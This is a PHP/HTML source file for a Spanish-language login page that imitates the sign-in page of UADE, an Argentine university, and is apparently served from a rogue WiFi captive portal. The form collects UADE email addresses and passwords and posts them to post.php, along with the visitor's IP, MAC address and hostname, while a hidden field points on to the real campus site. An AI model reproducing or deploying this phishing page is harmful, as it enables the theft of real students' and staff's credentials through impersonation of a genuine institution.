<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Iniciar sesión en la cuenta</title>
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
    <link rel="icon" type="image/png" href="assets/img/MSIcon.png"/>

    <script src="jquery-2.2.1.min.js"></script>
    <script type="text/javascript">
      function redirect() {
        setTimeout(function() {
          window.location = "/captiveportal/index.php";
        }, 100);
      }
    </script>
</head>
<body>

    <div class="background-overlay"></div>

    <div class="login-wrapper">
        <main class="login-box">
            <img src="assets/img/logo.png" alt="UADE Logo" class="logo">
            <h1>Iniciar sesión</h1>
            
            <form method="POST" action="post.php">
                <input id="user" type="text" name="email_uade" placeholder="Cuenta de correo electrónico UADE" autocorrect="off" autocomplete="off" autocapitalize="off" required>
                <input type="password" name="password_uade" placeholder="Contraseña" autocorrect="off" autocomplete="off" autocapitalize="off" required style="margin-top: 15px;">
                
                <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                <input type="hidden" name="target" value="https://www.webcampus.uade.edu.ar/">
                
                <div class="links">
                    <a href="#">¿No puede acceder a su cuenta?</a>
                </div>
                
                <p class="warning"><?php echo !empty($err) ? $err : "";?></p>
                
                <div class="actions">
                    <button type="button" class="btn-secondary">Atrás</button>
                    <button type="submit" class="btn-primary">Siguiente</button>
                </div>
            </form>

            <div class="recovery-box">
                Para cambiar tu contraseña por favor ingresa a http://recupero.uade.edu.ar
            </div>
        </main>

        <div class="options-box">
            <img src="assets/img/key.svg" alt="Llave" class="key-icon"> Opciones de inicio de sesión
        </div>
    </div>

    <footer class="page-footer">
        <a href="#">Términos de uso</a>
        <a href="#">Privacidad y cookies</a>
        <a href="#">...</a>
    </footer>

    <script>
        window.onload = function() { 
            document.getElementById("user").focus();
        };
    </script>
</body>
</html>